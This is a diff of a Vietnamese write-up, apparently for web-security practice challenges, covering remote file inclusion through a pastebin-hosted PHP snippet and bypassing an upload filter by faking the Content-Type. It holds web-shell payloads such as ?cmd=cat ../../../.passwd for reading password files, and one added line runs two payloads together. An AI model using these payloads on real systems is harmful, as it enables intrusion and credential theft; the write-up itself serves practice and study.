@@ -99,6 +99,8 @@ name too long
 
 ĐIỀU QUAN TRỌNG VỚI DẠNG BÀI REMOTE FILE INCLUSION NÀY , TA PHẢI INCLUDE 1 FILE TỪ WEB SERVER KHÁC !
 
+![image](https://user-images.githubusercontent.com/77602549/164913369-8c5bb10e-4b20-4d0f-94b6-c4971bb94b8f.png)
+
 
 Dùng 1 server khác để get tham số là câu lệnh <?php echo file_get_contents ('index.php')?>
 
@@ -106,6 +108,12 @@ Mình sẽ đề xuất sử dụng https://pastebin.com/ vì nó khá là tiệ
 
 
 ?lang=https://pastebin.com/raw/LjpyDxwq?
+
+Chúng ta có thể thấy được source của file index.php như sau: 
+
+
+![image](https://user-images.githubusercontent.com/77602549/164913436-ad52a7cf-d6ec-4717-ba67-3a515c17e02e.png)
+
 
 
 
@@ -135,19 +143,44 @@ echo $data;
 
 ?>
 
+![image](https://user-images.githubusercontent.com/77602549/164960644-b3a34d8c-6c4d-49db-afef-ee43889d87ab.png)
+
+
+![image](https://user-images.githubusercontent.com/77602549/164960537-34859513-220c-40d9-ac16-164c956ae834.png)
+
+
+
 ?cmd=ls -la
 
-?cmd=cat ../../../.passwd
+
+![image](https://user-images.githubusercontent.com/77602549/164960705-8ba8b453-9ac8-4368-a798-a2b3c1d47d97.png)
+
+
+?cmd=ls -la?cmd=cat ../../../.passwd
+
+
+![image](https://user-images.githubusercontent.com/77602549/164960719-3c6f6c01-c6e1-4f1b-9e35-59178a2cd8be.png)
 
 
 ## File upload – MIME type
 
 ![image](https://user-images.githubusercontent.com/77602549/164523876-fdd1951d-9f97-4e9e-b4d3-604da8d6cda5.png)
+[Mine type](https://wiki.tino.org/mime-type-la-gi/)
+
+![image](https://user-images.githubusercontent.com/77602549/164966150-7ea79496-ffd0-4ef9-b6c8-53c0a297d1d5.png)
 
 
 Chổ Content-type nó sẽ định nghĩa kiểu dữ liệu mà bạn sẽ upload lên, thay thành image/png nó sẽ hiểu đó là ảnh chứ không phải php file.
 
+![image](https://user-images.githubusercontent.com/77602549/164966176-4c78ae19-2485-4107-8e98-2dd98b1fc94a.png)
+
+
 ?cmd=cat ../../../.passwd
+
+
+![image](https://user-images.githubusercontent.com/77602549/164966203-5d38b61b-fa6a-4290-addd-827707167cd1.png)
+
+
 
 
 
